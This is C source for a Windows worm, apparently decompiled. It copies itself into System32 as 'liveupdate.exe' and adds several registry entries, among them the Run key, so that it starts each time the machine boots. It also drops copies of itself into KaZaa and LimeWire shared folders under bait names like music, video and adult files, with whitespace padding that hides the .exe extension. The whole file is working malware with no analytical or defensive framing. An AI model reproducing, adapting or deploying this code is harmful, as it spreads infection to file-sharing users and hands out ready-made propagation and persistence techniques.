#include "data_globals.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    int iVar1;
    HKEY local_11c;
    CHAR local_118[260];
    DWORD local_14;
    HMODULE local_10;
    char wormpath[MAX_PATH];    // local buffer

    GetWindowsDirectoryA(_windir, MAX_PATH);
    local_10 = GetModuleHandleA(NULL);
    local_14 = GetModuleFileNameA(local_10, wormpath, MAX_PATH);

    // Build "C:\Windows\System32\liveupdate.exe" in _windir
    strcat(_windir, "\\System32\\liveupdate.exe");

    CopyFileA(wormpath, _windir, 0);

    RegCreateKeyA((HKEY)0x80000000, "CLSID\\{7A9D77BD-5403-11d2-8785-2E0420524153}", &local_11c);
    RegSetValueExA(local_11c, "Branko", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    RegCreateKeyA((HKEY)0x80000001, "Software\\Microsoft\\Internet Explorer\\InternetRegistry", &local_11c);
    RegSetValueExA(local_11c, "Branko", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    RegCreateKeyA((HKEY)0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\Remote", &local_11c);
    RegSetValueExA(local_11c, "Explorer", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    RegCreateKeyA((HKEY)0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &local_11c);
    RegSetValueExA(local_11c, "Branko", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    RegCreateKeyA((HKEY)0x80000001, "Software\\Kazaa\\Transfer", &local_11c);
    RegSetValueExA(local_11c, "Upload", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    // Missing registry key (original lines 62‑63)
    RegCreateKeyA((HKEY)0x80000001, "Software\\Microsoft\\Protected Storage System Provider\\S-1-5-21-1004336348-484061587-1177238915-500\\NoAction", &local_11c);
    RegSetValueExA(local_11c, "Branko", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    RegCreateKeyA((HKEY)0x80000002, "Software\\Microsoft\\Windows Live\\Communications Clients\\Share", &local_11c);
    RegSetValueExA(local_11c, "Send", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    // P2P copies
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\gratis.mp3.exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\ladygaga.mp3                    .exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\maliciousremovaltool.exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\ladyinbed.avi                    .exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\ReadMe!.nfo                    .exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\list-download.txt                    .exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\game-collection.exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\porno+18.mpeg                    .exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\remoteotherkazaa.exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\softpacked.exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\LimeWire\\gratis.zip.exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\LimeWire\\My Shared Folder\\spaceticket.doc                    .exe", 0);
    CopyFileA(wormpath, "C:\\WINDOWS\\system32\\inetsrv.dll                    .exe", 0);

    return 0;
}
